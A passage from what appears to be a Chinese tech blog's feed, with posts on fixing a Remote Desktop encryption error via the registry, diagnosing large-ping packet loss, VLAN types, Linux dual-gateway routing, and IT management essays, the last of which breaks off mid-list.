      <content type="html"><![CDATA[<p>远程桌面出现了如下错误：“由于数据加密错误，这个会话将结束。请重新连接到远程计算机。”。</p><p><a href="http://suchalin.blog.163.com/;" target="_blank" rel="noopener">症状</a>：安装 Windows 2000 安全累积包 1 (SRP1) 之后，终端服务客户端可能无法连接到终端服务服务器。当您在 Windows XP Professional 计算机上使用远程桌面 Web 连接连接到终端服务服务器时，也可能会遇到此问题。发生此问题时，系统事件日志中将记录事件 ID 50：</p><p>Event Type:Error</p><p>Event Source:TermDD</p><p>Event ID:50</p><p>Description:</p><p>The RDP protocol component “DATA ENCRYPTION” detected an error in the protocol stream and has disconnected the client.</p><p>有关其他信息，请单击下面的文章编号，以查看 Microsoft 知识库中相应的文章：</p><p><a href="http://support.microsoft.com/kb/307454/" target="_blank" rel="noopener">307454</a>  (<a href="http://support.microsoft.com/kb/307454/" target="_blank" rel="noopener">http://support.microsoft.com/kb/307454/</a> ) MS01-052：无效的 RDP 数据可能导致终端服务故障</p><p>终端服务客户端在连接尝试期间还可能会收到以下错误信息：</p><p>The terminal Server has ended the connection.</p><p><a href="http://suchalin.blog.163.com/;" target="_blank" rel="noopener">原因</a>：Icaapi.dll 和 Rdpwsx.dll 动态链接库 (DLL) 之间潜在的争用条件可能会导致终端服务服务器上的证书私钥不同步。</p><p><a href="http://suchalin.blog.163.com/;" target="_blank" rel="noopener">解决方案</a>：<strong>警告</strong>：注册表编辑器使用不当可导致严重问题，可能需要重新安装操作系统。Microsoft 不能保证您可以解决因注册表编辑器使用不当而导致的问题。使用注册表编辑器需要您自担风险。  </p><p>要解决此问题，请按照下列步骤操作：</p><ol><li>启动注册表编辑器。</li><li><p>找到并单击下面的注册表子项：</p><p><strong>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\TermService\Parameters</strong></p></li><li><p>在此注册表子项下，删除下列值：</p><ul><li>Certificate</li><li>X509 Certificate</li><li>X509 Certificate ID</li></ul></li><li>退出注册表编辑器，然后重新启动服务器。</li></ol>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>如何修改linux登录前后的信息</title>
      <link href="/2010/01/18/how-to-change-the-information-before-and-after-the-linux-login/"/>
      <url>/2010/01/18/how-to-change-the-information-before-and-after-the-linux-login/</url>
      <content type="html"><![CDATA[<p>/etc/motd和/etc/issue分别是log in后和之前的消息</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>为人处事有哪些潜规则？</title>
      <link href="/2010/01/13/what-are-the-unspoken-rules/"/>
      <url>/2010/01/13/what-are-the-unspoken-rules/</url>
      <content type="html"><![CDATA[<p>“德”系为人处事的中心和根本。是“信”“诺”“礼”的根基。</p><p>人心是别人的人心。记住这样的话，或让自己终身受益。正所谓“害人之心不可有，防人之心不可无”。</p><p>　　让我们来了解一下为人处事必知的几大“潜规则”吧！</p><p>　　<strong>一、人生要乐观，人心要悲观</strong></p><p>　　<strong>人生</strong>是自己的人生，要乐观，所谓笑着过是一天，哭着过也是一天，那就笑着过吧。</p><p>　　<strong>人心</strong>是别人的人心。所谓“害人之心不可有，防人之心不可无”。对人不能轻易相信，尤其是现在骗子太多了。不要给陌生人开门，尽可能不与你的仇人一起喝酒，不要消费你不了解的人送给你的入口的礼品，在旅途中不要喝陌生人送给你的饮料。</p><p>　　<strong>不要轻易把别人当作知己。</strong>不要对自己的眼力太自信，对人一定要经过长期的观察，经过若干事件的考验。俗话说：路遥知马力，日久见人心。当你把某人当作可以信赖、可以依靠的知己的时候，危险可能正在悄悄向你袭来；</p><p>　　<strong>不要轻易向别人诉说心事。</strong>当年林彪说：“见人只说三分话，未可抛却一片心”。当你向某人说出你心里的秘密后，灾难可能就要降临了；当你向某人倾诉心里的苦恼后，你的心里话极有可能就成了公开的话。</p><p>　　<strong>二、封住自己的嘴，硬化自己的耳</strong></p><p>　　<strong>封住自己的嘴，包括四个意思：</strong></p><p>　　一是说没有调查研究就没有发言权，不可拾人牙慧，对自己并不了解事实真相的事情，不要瞎说，免得被动；</p><p>　　二是不要过于发牢骚，因为发牢骚没有用，“牢骚太盛防肠断”；</p><p>　　三是对别人少批评，少指责，除非人家真心实意听你教导并而且有非常强的心理承受能力，凡事还是要讲个效果，既然批评无用而且有负效果，何苦呢？尤其是不要当着众人的面指责人；</p><p>　　四是不要在背地议论人的是非，不要跟张三说李四如何如何，因为当你跟张三说了有关李四的事情后，那张三极有可能把你说的话传给李四，这样一来，你与李四就会产生矛盾。</p><p>　<strong>　硬化自己的耳，是说不要耳根子发软</strong>，听风就是雨，别人说什么你就信什么，而是要多问几个为何，更不要被人当枪炮使。有的人比较愚笨，头脑过于简单，经不起别人挑拨，总是被人当枪使，这种可恨又可气、缺乏定力的人太多了。</p><p>　　进一步说，对于媒体记者的报道，不要轻易相信，不要被媒体利用，不要轻易表态，不要轻易评论，不要被人给忽悠了，要了解事实真相以后再说。</p><p>　　<strong>三、沉着冷静，控制情绪</strong></p><p>　　俗话说：“冲动是魔鬼”。人在情绪失控的时候，极有可能不计后果，骂脏话，出拳头，捅刀子，等冷静下来之后才后悔，然而后悔也晚了。遇事一定要冷静冷静再冷静，忍耐忍耐再忍耐，控制控制再控制。有一些人喜欢把激将法改为激怒法，目的是让你情绪失控，失去理智，干出蠢事，你可不能上当。</p><p>　　<strong>四、与人交谈要控制音量，会议发言要把握份量</strong></p><p>　　一般认为，一个人在与人交谈时假若高腔大嗓，那么这个人就缺乏修养，没有多少才华。可能这是一种偏见。可是应该尽可能避免偏见给你带来的不利后果。与人交谈时，一定要控制自己的音量，声音不高不低，语速不快不慢，显得稳稳当当，成熟老道。</p><p>　　在会议上发言时，对发言内容要反复推敲，逻辑严密，不要有漏洞。有人发言后，其观点极容易就被别人否定，就是因为有漏洞，不严密，经不起反驳。对于别人的发言，当你要否定其观点时，一定要考虑你的否定意见能立的住？是不是经不起人家反戈一击？</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>用协议软件分析ping大包丢包故障</title>
      <link href="/2010/01/12/use-protocol-software-to-analyze-the-failure-of-the-pinger-packet/"/>
      <url>/2010/01/12/use-protocol-software-to-analyze-the-failure-of-the-pinger-packet/</url>
      <content type="html"><![CDATA[<p>故障环境</p><p>　　<img src="http://img.3648.com/Image/1231031563_ddvip_5111.jpg" alt="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！" title="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！"></p><p>　　说明：</p><p>　　1、办公机器都属于10.12.128.0/24网段；</p><p>　　2、办公机器通过一个二层的接入交换机、光电转换器接入集团核心交换机。</p><p>　　故障现象</p><p>　　●Ping大包丢包严重</p><p>　　●ping小包正常</p><p>　　●前期使用单机ping大包未出现丢包现象</p><p>　　故障前期简单分析</p><p>　　●链路测试、策略检查均无异常，该故障非一般连通性故障</p><p>　　●此类丢包问题，主要是需要定位出丢包的位置</p><p>　　●可能故障点主要有：</p><p>　　<img src="http://img.3648.com/Image/1231031564_ddvip_5307.jpg" alt="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！" title="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！"></p><p>　　故障分析-分析方法</p><p>　　数据包分析法</p><p>　　主要通过专有的网络分析工具（科来网络分析系统）将故障时相应的数据包捕获下来进行深度分析，并通过分析发现相应的异常，从而定位故障原因的方法</p><p>　　对比分析法</p><p>　　主要指通过对网络中传输的数据包的对比，分析出数据包在传输过程中各个中间设备对数据包的相应处理过程，包括更改、丢弃和转发等</p><p>　　在此次的故障解决过程中，我们主要使用对比分析法分析出将大数据包丢弃的中间设备或链路。</p><p>　　在实际的分析过程中，我们需要考虑到抓包的方便性和相应中间设备的功能特性选取数据包捕获点</p><p>　　<img src="http://img.3648.com/Image/1231031564_ddvip_8108.jpg" alt="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！" title="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！"></p><p>　　 在这个故障环境下，我们主要选在接入交换机与核心交换机上抓取数据包</p><p>　　●在测试机器10.12.128.66上使用如下命令测试网络的大包传输情况：ping 10.1.10.9 -l 10000 t 。</p><p>　　●我们可以简单计算一下ping10000字节的大包在以太网中会被分成多少个分片：</p><p>　　PING产生的IP负载=10000(ping负载）+8（icmp头长度）</p><p>　　一个以太网IP包的最大有效负载=1500（以太网MTU)-20（IP包头长度）=1480B</p><p>　　产生IP分片数的计算方式为：</p><p>　　10008/1480=6余1128，即一个1500B的icmp报文，5个1500B的ip分片包，1个1148B的ip分片包</p><p>　　通过该测试命令重现了故障现象：大文件传输丢包情况较为严重。</p><p>　　故障分析过程-抓包</p><p>　　我们分别在核心交换机6509、接入交换机上做端口镜像（端口镜像的详细命令和过程在此不再描述），将其相应链路的数据包镜像到我们选取的监听口，我们再通过科来网络分析系统捕获相应的数据包</p><p>　　<img src="http://img.3648.com/Image/1231031564_ddvip_2827.jpg" alt="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！" title="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！"></p><p>　　接入交换机数据包分析结论</p><p>　　●Ping超时的原因为中间某个大包在传输的过程中被丢弃了，导致接收端重组超时</p><p>　　●接入交换机转发了所有的分片包，即某个分片包不是在接入交换机上丢弃的</p><p>　　故障分析过程-对比分析</p><p>　　2.分析核心交换机6509上抓取的数据包</p><p>　　<img src="http://img.3648.com/Image/1231031565_ddvip_2410.jpg" alt="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！" title="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！"></p><p>　　结论：</p><p>　　这个被丢弃的某个分片在到达核心交换机6509前就被丢弃</p><p>　　对比分析结果</p><p>　　根据前面的对比分析，结合拓扑结构，我们可以知道，某个分片包是在接入交交换机转发之后、核心交换机6509接收之前被丢弃的，那么可能被丢弃的位置只剩下光电转换器了！</p><p>　　<img src="http://img.3648.com/Image/1231031565_ddvip_2189.jpg" alt="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！" title="用协议软件分析ping大包丢包故障 - suchalin - 为了更好的生活而奋斗！"></p><p>　　 故障解决</p><p>　　使用替换法，将接入交换机端的光电转换器更换为一个全新的光电转换器，测试一切正常</p><p>　　技巧小结</p><p>　　定位可能故障点</p><p>　　数据包分析法</p><p>　　对比分析法</p><p>　　使用到的知识点：</p><p>　　分片计算</p><p>icmp重组超时</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>standard mux super smart 这几种VLAN有什么区别？</title>
      <link href="/2010/01/08/what-s-the-difference-between-a-standard-mux-super-smart-anda-few-vlans/"/>
      <url>/2010/01/08/what-s-the-difference-between-a-standard-mux-super-smart-anda-few-vlans/</url>
      <content type="html"><![CDATA[<p>标准VLAN就是普通VLAN，一个vlan就是一个广播域，相同VLAN的用户都会收到同样的广播报文，用户多时，容易产生广播风暴。</p><p>MUX VLAN一般用于DSLAM接入设备，每个用户一个VLAN，并与上网PVC关联起来(不同于普通VLAN关联到以太网口)，到上层汇聚设备再加上外层VLAN，可以唯一区分上网用户。</p><p>super vlan用于SR设备，解决共用网关问题，即不同VLAN用户可以使用相同网关ip，从而节省IP地址资源。</p><p>SMART VLAN用于接入设备，同一vlan可以实现下行流量互相隔离，上行不隔离，使用互动电视业务时，一般使用SMART VLAN来标识用户。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux双网关双线路网络设置</title>
      <link href="/2010/01/06/linux-dual-gateway-dual-line-network-settings/"/>
      <url>/2010/01/06/linux-dual-gateway-dual-line-network-settings/</url>
      <content type="html"><![CDATA[<p>由于电信和网通之间互联互通的问题，很多人选择双线路机房，所谓双线路机房就是拥有两条出口，一条电信一条网通。最近在一个双线路机房测试一台服务器，打算作为论坛的数据库服务器使用，服务器操作系统为 Linux。计划配置为双IP，双域名，使得浏览者通过电信和网通两条线路都能正常访问服务器，而且各走各的，互不影响。在配置网络的时候遇到了问题，由于Linux默认只有一个网关，在网络上查询了很久，找到一个解决方案，因此整理了一下。</p><p>服务器操作系统RedHat linux 9，设置两张路由表</p><p>1. vi /etc/iproute2/rt_tables，增加网通和电信两个路由表</p><p>251 tel   电信路由表</p><p>252 cnc 网通路由表</p><p>2. 给网卡绑定两个地址用于电信和网通两个线路</p><p>ip addr add 192.168.0.2/24 dev eth0</p><p>ip addr add 10.0.0.2/24 dev eth1</p><p>3、分别设置电信和网通的路由表</p><p>电信路由表：</p><p>＃确保找到本地子网</p><p>ip route add 192.168.0..0/24 via 192.168.0.2 dev eth0 table tel</p><p>＃内部回环网络</p><p>ip route add 127.0.0.0/8 dev lo table tel</p><p>＃192.168.0.1为电信网络默认网关地址</p><p>ip route add default via 192.168.0.1 dev eth0 table tel</p><p>网通线路路由表:</p><p>＃确保找到本地子网</p><p>ip route add 10.0.0.0/24 via 10.0.0.2 dev eth1 table cnc</p><p>＃内部回环网络</p><p>ip route add 127.0.0.0/8 dev lo table cnc</p><p>＃10.0.0.1是网通的默认网关</p><p>ip route add default via 10.0.0.1 dev eth1 table cnc</p><p>4、电信和网通各有自己的路由表，制定策略，让192.168.0.2的回应数据包走电信的路由表路由，10.0.0.2的回应数据包走网通的路由表路由</p><p>ip rule add from 192.168.0.1 table tel</p><p>ip rule add from 10.0.0.1 table cnc</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>哈佛大学凌晨4点半的景象</title>
      <link href="/2010/01/01/harvard-university-at-4-30-a-m/"/>
      <url>/2010/01/01/harvard-university-at-4-30-a-m/</url>
      <content type="html"><![CDATA[<p>哈佛大学凌晨4点半的景象</p><p>　　这再一次印证，任何人每一次的成功背后都有不为人知的付出和汗水。</p><p>　　哈佛大学图书馆馆训：</p><p>　　1．现在睡觉的话会做梦而现在学习的话会让梦实现</p><p>　　This moment will nap, you will have a dream; But this moment study,you will interpret a dream.</p><p>　　2．我无所事事地度过的今天是昨天死去的人们所奢望的明天</p><p>　　I leave uncultivated today, was precisely yesterday perishes tomorrow which person of the body implored.</p><p>　　3．感到晚了的时候其实是最快的时候</p><p>　　Thought is already is late, exactly is the earliest time.</p><p>　　4．不要把今天的事拖到明天</p><p>　　Not matter of the today will drag tomorrow.</p><p>　　5．学习的痛苦是一时的而没有学习的痛苦是一辈子的</p><p>　　Time the study pain is temporary, has not learned the pain is life-long.</p><p>　　6．学习不是人生的全部但连学习都征服不了你还能做什么？</p><p>　　The study certainly is not the life complete. But, sincecontinually life part of - studies also is unable to conquer, what butalso can make?</p><p>　　7．学习不是因为缺少时间而是缺少努力</p><p>　　Studies this matter, lacks the time, but is lacks diligently.</p><p>　　8．所有人的成功都不是偶然的</p><p>　　Nobody can casually succeed, it comes from the thoroughself-control and the will.</p><p>　　9.无法避免的痛苦就去享受吧！</p><p>　　Please enjoy the pain which is unable to avoid.</p><p>　　10．早起的鸟儿有虫吃</p><p>　　Only has compared to the others early, diligently diligently, canfeel the successful taste.</p><p>　　11．成功并不属于每个人</p><p>　　Nobody can casually succeed</p><p>　　12.时间在流逝</p><p>　　HOW time flies</p><p>　　13.今天流下的口水将变成明天流下的泪水</p><p>　　Now drips the saliva, will become tomorrow the tear</p>]]></content>
      
      <categories>
          
          <category> 生活琐事 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>IT经理七宗罪：过分渴求新技术居首位</title>
      <link href="/2010/01/01/the-it-manager-is-guilty-of-seven-sins-overeager-for-new-technology/"/>
      <url>/2010/01/01/the-it-manager-is-guilty-of-seven-sins-overeager-for-new-technology/</url>
      <content type="html"><![CDATA[<p>古代的宗教先知们，针对人类的恶行，划分出傲慢、妒忌、暴怒、懒惰、贪婪、贪食及色欲等七宗罪。2008年，梵蒂冈更新了传统的七宗罪，把新七宗罪和现代社会诱惑联系起来。新七宗罪为：伦理罪、从事基因改造科学实验、滥用药品、污染、社会不公、导致贫穷及少数人过度累积财富。</p><p>不管是新还是旧，这些“罪行”都损害了个人的身心。其实在企业IT管理中，IT经理们也容易犯“七宗罪”，这些“罪行”一样后果严重，对整个企业的正常发展都会产生严重威胁。</p><p>过分渴求新设备、妒嫉其他部门的预算、无故向员工发泄怒火、因为傲慢心理耽误工作，这都是IT管理者在日常工作中会犯的错误。事实表明，必须提防这些过失，以免影响企业的发展。</p><p><strong>第一宗罪 过分渴求新技术</strong></p><p>IT领域有好多种欲望，如对权力、职位、甚至物资的欲望，对IT工作破坏性最大的也许是对新设备控制不住的欲望。</p><p>IT作家James J. DeLuccia曾经指出，IT领域最常见的欲望就是，纯粹为了拥有新技术而一味追求新技术。“IT经理们错误地追求最新的处理器和硬件，就为了所谓的‘与时俱进’。而事实是，大多数情况下，目前在用的技术往往还是用得好好的。”</p><p>有一家消费品生产商，它的运营情况良好，业务运行流畅，客户对服务也很满意。但是，这家公司的IT经理们沉迷于新技术，决定全面升级至新版本的Oracle数据库和至强处理器。与许多为了追求新技术而开展的IT项目一样，这家公司遇到的头一件事就是，该公司原先使用的用来连接数据库的软件不支持新版本的Oracle产品。而且，原先的软件开发商已倒闭，无法提供相关的技术支持，于是这次升级的后果就变成了公司的主要服务应用程序再也无法正常运行。更糟糕的是，新硬件需要更多的电力支持，结果数据中心现有的电力和UPS系统满足不了电源需要，断电现象不断发生。除此之外，还有硬件及维护、基础架构升级、软件许可证、能耗成本及培训Oracle数据库管理员等诸多因素，带来了大规模的成本增加。</p><p>DeLuccia认为，一家企业如果追求新技术，它一定要实用，而且是业务所必需的，纯粹为了满足欲望而追求技术只会带来惨痛损失。</p><p><strong>第二宗罪 信息饕餮</strong></p><p>拼命隐藏信息造成的后果不如迷信新技术的欲望来得严重，但是前者更常见。这种不愿意与别人共享信息的做法往往被误以为是保障工作安全的办法。</p><p>网络管理软件提供商SolarWinds的技术主管Josh Stephens说：“有这样一类IT经理，他们很不喜欢透露网络基础架构方面的信息。他们让别人处理服务器和网络交换机，但他们自己控制着网络核心部分，不想让别人知道网络核心在如何运行。这种做法的结果是，一旦这些IT经理外出了，而公司的网络系统恰恰在这个时候发生故障停止运行了，那就没有人能让系统恢复起来，因为大家不知道系统是如何构建的，他们只好从头做起，重新构建网络核心。这项工作原本可能只要一个小时，现在也许要花上整整一天半的时间。这些IT经理们往往认为，如果知道别人不知道的东西，自己就显得比较聪明。而事实上，如果与人分享信息，并且教给身边的人，那样才比较明智。”</p><p>位于美国新泽西州的一家咨询公司的副总裁Marcelo Schnettler表示，除了拼命隐藏信息外，IT人员当中另一种常见的饕餮表现就是拼命隐藏项目。</p><p>Schnettler表示，高级管理人员接过某些项目，不是因为想获得完成所有这些项目所带来的关注和资金，就是内心无法拒绝项目。结果是，IT部门最后面对众多项目忙得不可开交，随后无力处理更重要的紧急情况。</p><p><strong>第三宗罪 贪婪压倒良知</strong></p><p>Asuret公司致力于减少IT项目失败，公司的首席执行官Michael Krigsman表示，IT项目失败，往往归咎于傲慢和贪婪这两个致命因素。</p><p>他把这个问题称为“魔鬼三角”：提出不切合实际需求的幼稚或傲慢的客户、随意许下承诺的系统集成商和顾问，以及左右为难的技术提供商。</p><p>他表示，即使系统集成商在上马项目时诚心诚意，他们也会面临困境。他们要么告诉客户，这些需求注定不合理，因而错失这笔合同，要么还是按客户的要求去做，但面临项目失败的风险。</p><p>项目失败会给集成商带来更多的麻烦，但这几乎总是意味着能够获得更多的收入，因为集成商按小时收取修补漏洞的高额费用。这时候，贪婪心理就会占上风。与此同时，技术提供商不愿意疏远为自己带来付费客户的集成商，因此会采取袖手旁观的做法。</p><p>要克服天生的贪婪心理，就要在协议中明确奖励机制。比方说，如果项目提前完工，给予奖励；如果项目延时或超出预算，就要受到严厉惩罚。</p><p><strong>第四宗罪 IT人员的懒惰作风</strong></p><p>IT经理尽管工作很拼命，但是往往犯下懒惰的过失。</p><p>数据质量专业公司DataFlux的首席执行官Tony Fisher认为，如果放贷机构的IT部门之前更多地关注数据质量和准确性，2008年的抵押债务危机也许不会这么严重了。</p><p>他表示，从抵押贷款客户收集而来的数据有许多是不准确的。其实通过技术方法，可轻松验证这些数据的正确性，然后添加到系统中，但从来没这么做。放贷机构的IT部门对提供的数据信以为真。抵押贷款打包成了一揽子财务方案，然后卖给互助基金和银行，根本没想到要去验证这些是不是合格的金融产品。很难说这是业务部门的错还是IT部门的错。但这个问题原本可以由技术来解决。</p><p>懒惰作风危害IT部门的方式有好多种：从疏于监管外包协议、不够积极的合规审计、数据安全保护不力，到没有采用基本的网络监控。</p><p>SolarWinds的Stephens举例说：“有一家规模很大的宽带提供商曾部署了一套非常昂贵的网络监控系统，但是这套系统没有顺畅运行，宽带提供商对此也无动于衷。后来有一天，他们遭遇了系统停运事件，结果影响到了上百万人。他们还不知道出了什么情况，直到客户开始打来电话才知道这回事。要是他们之前部署了功能很基本、但可以正常运作的网络监控系统，就能大大改善服务客户的水平。”</p><p>IT管理解决方案厂商Sparxent的共同创办人Dave Taylor表示，考虑到当前的经济形势，现在正是企业内IT部门积极忙碌起来的大好时机。“经济衰退期间，让IT人员忙碌起来比过去显得更重要。如果某个重大项目因你不愿意花正常需要的时间而被拖延，现在应该积极补救。让公司知道IT部门没有一丝懒惰作风，IT部门投入大量时间，就为了以后替公司省钱。”</p><p><strong>第五宗罪 嫉妒同一家公司的其他部门</strong></p><p>DeLuccia表示，随着一家公司不断成熟，有些人会逐渐出现各自为政的心态。换句话说，大家不再共享信息，而是把大部分时间用来保护自己的地盘，嫉妒其他部门的地位或预算。随之而来的是，出现重复性项目、缺乏透明度、破坏企业文化的人事纷争，结果遭殃的是整个公司。</p><p>DeLuccia以一家跨国建筑设备生产商为例说：“一名经理负责该公司相当一部分的IT运营工作，他总抱怨其他部门有更合理的考评机制和更充足的资金。他总是说‘我做不了这个，是因为没有其他部门那么多的预算； 这就是为什么我的部门无法正常运作的原因。’”</p><p>第三方审计结果显示，这个经理领导的部门屡屡达不到服务级别协议的规定，也不像一个真正的业务部门在运作。结果，公司解雇了这名IT经理，他领导的小组也被解散了。</p><p>在DeLuccia看来，导致这名IT主管被解雇的原因就是嫉妒，他把注意力全放在了别人身上，而不是自己更主动些。</p><p>SolarWinds的Stevens说，类似的情况出现在了许多企业的IT部门。“IT经理们总想接过同一家公司其他IT人员的责任，负责基础架构的人总想管理服务器，负责服务器的人总想还能管理数据库。他们不断接过越来越大的责任，结果不再为本公司真正出力，而是一心想接手别人的工作。”</p><p><strong>第六宗罪 不控制愤怒</strong></p><p>“不控制愤怒”也可以被称之为威胁式管理，但是情绪完全失控不是IT经理激励团队的办法。</p><p>六年来，Marcelo Schnettler在不同公司的六名CIO手下干过，这些CIO几乎都曾经当众发怒。有一次系统出现了长时间停运，一名CIO冲到他认为应该负责的一名员工的办公间，用非常难听的话严厉责骂对方。</p><p>Schnettler说：“CIO乱发火可能是危害最大的一宗罪。这样会削弱士气，会在IT部门里面助长‘推卸责任’的歪风，结果导致相互指责、缺少合作。”</p><p>计算机与网络顾问Bill Home在一家大型电信公司的IT和工程部门工作过多年，他曾遇到过一名IT经理要求程序员在极短的时间内完成某项任务。而此时已经是周五傍晚大家准备下班，这名经理勃然大怒。开始发脾气，冲程序员们大吼，要他们必须周末加班，以便按时完工。大伙当面嘲笑说：“你跟工会管事去说吧！周一再见。”结果自然是没有按时完工，那名经理也在七个月后被调到了不大要紧的岗位。</p><p><strong>第七宗罪 骄傲情绪滋生</strong></p><p>骄傲有时也是一宗罪，因为它会让IT经理盲目地以为自己知道一切，哪怕他们明明知道对某个话题所知甚少。</p><p>DeLuccia说：“骄傲的人以为自己完成了任务，实现了目标。骄傲比别的任何一宗罪更会使公司面临竞争和威胁。”</p><p>Asuret公司的Krigsman强调，来自骄傲心态的自大和自负情绪会给企业带来重大的经济损失。“有这么一家年收入多达数十亿美元的制造商，拥有庞大的分销渠道。它没有购买现成的ERP系统，而是自己开发。问题在于，那位CIO不相信质量保证这一套。于是，没有经过任何测试，就把自行开发的这个系统部署到数百个零售场地。在砸进去了数百万美元之后，项目的效果很差这个项目最终还是被取消，项目小组的成员随之被解散。”</p><p>IT Now公司的Vickers表示，一个最严重的问题是，有些技术经理以为自己就能搞定，实际上根本不是这样。“我们走访了几家公司，探讨托管备份的重要性。他们表示，托管备份对自己来说不成问题。但是我们认真看了一下，发现过去三个月没有哪家公司使用RAID系统和备份。他们觉得，备份自己搞搞就行了。”</p><p>Sparxent的Taylor认为，IT人员需要抑制骄傲情绪，更坦然面对过去自己犯下的错误。聪明的IT主管需要与首席执行官和首席财务官站在同一条战线上。因此，最好的办法是，对IT的成功和失败都要非常坦诚。需要抑制骄傲情绪；承认过去的项目没有带来投资回报，这会帮助公司的老板认识到，IT主管关注促使公司取得整体上的成功。</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>2010年IT经理必须拥有的五项管理技术</title>
      <link href="/2010/01/01/the-five-management-techniques-the-it-manager-must-have-in-2010/"/>
      <url>/2010/01/01/the-five-management-techniques-the-it-manager-must-have-in-2010/</url>
      <content type="html"><![CDATA[<p>随着更多的企业扩大虚拟化应用和考虑使用云计算，普通的IT部门将变得更加复杂。对于2010年的企业IT经理来说，这意味着他们必须更新他们使用的技术以监视、管理和优化这个环境。</p><p>业内观察人士称，IT机构在2010年面临的最大挑战更多的是文化方面的，而不是技术方面的。从打破在自己管辖区内工作(也就是竖井)的趋势和让IT服务更好地满足业务的需求，IT部门在2010年面临许多可怕的任务。例如，虚拟化和云计算需要跨IT领域地采取行动并且将推动IT机构打破对这种新技术的障碍。</p><p>Gartner负责研究的副总裁David Williams说，目前实现最新的工具的真正价值的制约因素是IT机构，特别是企业中的IT部门。企业在竖井中工作，不仅在不同的管辖区域(如网络、应用程序、服务器、台式电脑和存储)，而且还在Linux服务器管理、大型机管理、Windows管理和虚拟化管理等管辖区域。正在建立的跨领域的团队和任务将理解这种情况和缓慢地解决这些问题。在2010年，IT机构将继续讨论他们如何调整机构以便使IT运营成为以服务为中心的和符合业务需求的。</p><p>分析师称，如果能够消除这种文化的障碍，一些工具将使大多数IT部门在2010年更轻松地适应高级的技术。下面是行业观察家对2010年优化的IT服务交付和高级的数据中心运营所必须的五项技术的简单预测。</p><p><strong>1. IT服务保证</strong></p><p>管理IT服务交付性能包括多种技术，如报告用户使用应用程序的体验等各方面情况的技术。IT部门需要能够得到网络通讯流的可见性以及支持IT服务的多个组件的应用性能。从高级的发现技术到通讯流分析和交易监视，IT部门需要看到一项服务的全部路径，即使这个路径存在于企业网络中和经过外部的云计算环境。</p><p>IT服务保证的前提并不完全是新的，并且直到最近一直是服务提供商普遍担心的问题。但是，企业IT机构本身已经开始成长为服务提供商。BMC、 CA、惠普、IBM和现在的EMC等公司都在宣称他们有能力提供一项IT服务的生命周期的洞察力。企业适应和扩展使用虚拟化的速度以及对内部和外部云计算环境日益增长的兴趣突出表明了2010年对这种技术的需求。</p><p>Forrester Research高级分析师Evelyn Hubbert说，一个需求是了解真正的端对端的情况。这就意味着对于最终用户体验的质量和服务质量有全面的可见性和控制。这意味着我们需要看到通讯流是如何在网络、系统、应用程序和数据库中流动的。它们都是参与这些服务的。IT机构认识到他们需要管理这些服务，而不是这个基础设施。</p><p><strong>2. 虚拟系统管理</strong></p><p>对2010年提出展望的厂商似乎对虚拟系统管理保持平静以支持推销云计算管理能力。但是，业内观察人士称，没有支持不同种类的虚拟系统和包含性能和容量管理的高级功能，就没有云计算管理。企业管理协会的研究经理Andi Mann说，虚拟化和自动化技术与云计算有直接的关系。虚拟服务器包括这个计算环境。自动化负责云计算的监视、管理、加密和遵守法规。虚拟化现在已经基本上成为主流。围绕虚拟系统管理有许多活动。边缘厂商正在把技术支持扩大到VMware以外的厂商，使他们的技术覆盖更多的企业。</p><p>在2009年，虚拟系统管理已经成为厂商必不可少的东西。在2010年，企业IT机构肯定要为自己的工具箱配置支持多个管理程序的虚拟系统工具。虽然VKernel、Surgient、Fortisphere、ManageIQ、Embotics和Veeam等公司在过去的几年里通过推出 VMware管理功能进入了这个领域，但是，分析师预计将看到这些技术创新的新来者被大企业收购，因为大型系统管理厂商正在寻求填补自己产品组合的空白。</p><p>IDC研究经理Mary Johnston Turner说，预计会出现许多收购，特别是在虚拟化管理领域。这个领域的许多小厂商将会被收购。</p><p><strong>3. IT服务目录</strong></p><p>随着IT部门开始优化服务交付，他们还将改善他们的提供的服务与用户社区交流的方式。分析师说，随着IT机构优化流程和更好地使自己的努力符合业务需求，把可用的IT服务放在一个容易理解的基于网络的IT服务目录中的趋势在2010年将爆炸式增长。</p><p>企业管理协会的Mann说，服务目录是非常有用的。但是，随着云计算的应用，服务目录已经成为基本的东西。IT机构认识到，他们必须能够与最终用户沟通，告诉最终用户允许他们得到什么和以什么频率得到这些东西以及数量的多数。没有IT服务目录，广泛的云计算应用是很难想象的。</p><p>IT服务目录的前提并不是新的，但是，业内观察人士表示，去年的经济衰退给围绕识别、解释和发布方便用户消费的IT服务列表的努力赋予了新的生命。ITIL(信息技术基础设施库)等最佳做法框架介绍了IT部门如何能够建立一个IT服务目录。BMC、Digital Fuel、newScale、Oblicore和PMG等厂商也开发了一些产品以帮助IT部门创建目录。</p><p>Forrester的Hubbert说，人们正在努力获得自己的服务目录以便让他们的客户知道自己能够得到什么和服务的费用是多少。这将使IT运营部门根据实际需求编制人员和组织自己的工作。</p><p><strong>4. 